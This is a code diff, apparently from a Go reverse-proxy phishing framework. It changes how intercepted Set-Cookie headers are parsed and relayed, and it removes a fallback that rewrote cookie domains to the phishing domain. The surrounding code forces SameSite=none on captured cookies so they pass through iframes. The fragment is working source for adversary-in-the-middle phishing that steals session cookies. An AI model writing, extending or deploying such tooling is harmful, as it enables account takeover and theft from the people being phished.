@@ -1430,34 +1430,30 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// 检查原始 Set-Cookie 是否包含 Partitioned 属性（Go 的 http.Cookie 不支持此属性）
 				hasPartitioned := strings.Contains(rawCookie, "; Partitioned")
 
-				// 解析 cookie（http.ParseCookie 返回切片）
-				parsedCookies, err := http.ParseCookie(rawCookie)
+				// 解析 cookie
+			// 如果 cookie 包含 Domain 属性，直接使用 parseCookieLoose（http.ParseCookie 对某些格式解析不正确）
+			var parsedCookies []*http.Cookie
+			if regexp.MustCompile(`(?i);\s*domain=`).MatchString(rawCookie) {
+				ck, err := parseCookieLoose(rawCookie)
+				if err != nil {
+					log.Debug("COOKIE_LOOSE_PARSE_FAILED: %v", err)
+					resp.Header.Add("Set-Cookie", rawCookie)
+					continue
+				}
+				parsedCookies = []*http.Cookie{ck}
+			} else {
+				ck, err := http.ParseSetCookie(rawCookie)
 				if err != nil {
 					log.Debug("COOKIE_PARSE_FAILED: %v, trying loose parser", err)
-					// 使用宽松的解析器
-					ck, err := parseCookieLoose(rawCookie)
+					ck, err = parseCookieLoose(rawCookie)
 					if err != nil {
 						log.Debug("COOKIE_LOOSE_PARSE_FAILED: %v", err)
-						// 解析失败时，对原始 Set-Cookie 字符串做 domain 替换
-						modified := rawCookie
-						// 提取 Domain 属性值（不区分大小写，支持 Domain= 和 domain=）
-						// 匹配 ; domain=xxx 或 ; Domain=xxx
-						domainMatch := regexp.MustCompile(`(?i)(;\s*domain=)([^;]+)`)
-						if matches := domainMatch.FindStringSubmatch(rawCookie); len(matches) == 3 {
-							origDomain := strings.TrimSpace(matches[2])
-							phishDomain, ok := p.replaceHostWithPhished(origDomain)
-							if ok && phishDomain != origDomain {
-								modified = strings.Replace(rawCookie, matches[1]+matches[2], matches[1]+phishDomain, 1)
-								log.Debug("COOKIE_DOMAIN_REPLACED: %s -> %s", origDomain, phishDomain)
-							}
-						}
-						log.Debug("COOKIE_FINAL: %s", modified)
-						resp.Header.Add("Set-Cookie", modified)
+						resp.Header.Add("Set-Cookie", rawCookie)
 						continue
 					}
-					// 成功解析，创建单元素切片
-					parsedCookies = []*http.Cookie{ck}
 				}
+				parsedCookies = []*http.Cookie{ck}
+			}
 
 				for _, ck := range parsedCookies {
 					// add SameSite=none for every received cookie, allowing cookies through iframes
